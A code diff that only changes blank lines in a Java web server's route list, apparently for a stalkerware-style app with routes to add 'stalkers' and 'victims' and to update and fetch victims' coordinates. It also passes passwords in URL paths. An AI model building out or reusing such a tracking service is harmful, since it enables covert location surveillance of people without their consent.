@@ -12,6 +12,9 @@ public class Main {
 
         get("/test",routes.testRoute);
 
+
+
+
         //----------------------------------------STALKER ROUTES--------------------------------------------------------
         post("/stalker/addStalker",routes.addStalker); //adds stalker from body
         get("/stalker/getStalker/:name/:password",routes.getStalker);
@@ -19,13 +22,13 @@ public class Main {
         get("stalker/links/:stalker/:link",routes.addLink);
 
 
+
+
         //----------------------------------------VICTIM ROUTES---------------------------------------------------------
         post("/victim/updatesParams/:nameStalker/:nameVictim",routes.updateParams); //update last cordinates of VIVTIM with id= :id
         post("/victim/addVictim",routes.addVictim); //adds VICTIM
         get("/victim/getVictim/:id/:name",routes.getVictim);
         get("/victim/getCords/:name",routes.getCords);
-
-
 
     }
 
